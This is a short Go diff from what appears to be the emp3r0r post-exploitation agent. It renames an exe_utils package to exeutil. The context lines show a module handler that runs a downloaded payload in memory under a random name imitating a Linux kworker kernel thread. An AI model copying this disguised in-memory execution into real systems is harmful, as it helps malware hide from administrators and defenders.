@@ -16,7 +16,7 @@ import (
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/common"
 	"github.com/jm33-m0/emp3r0r/core/internal/def"
 	"github.com/jm33-m0/emp3r0r/core/lib/crypto"
-	"github.com/jm33-m0/emp3r0r/core/lib/exe_utils"
+	"github.com/jm33-m0/emp3r0r/core/lib/exeutil"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
 
@@ -93,7 +93,7 @@ func ModuleHandler(download_addr, file_to_download, payload_type, modName, check
 				randName := fmt.Sprintf("[kworker/%d:%d-events]", util.RandInt(0, 20), util.RandInt(0, 10))
 				// if you need to pass arguments to the in-memory module, you can do it in environment variables
 				// when implementing the module, you can read the arguments from env
-				out, err = exe_utils.InMemExeRun(payload_data, []string{randName}, env)
+				out, err = exeutil.InMemExeRun(payload_data, []string{randName}, env)
 				if err != nil {
 					out = fmt.Sprintf("InMemExeRun: %v", err)
 				}
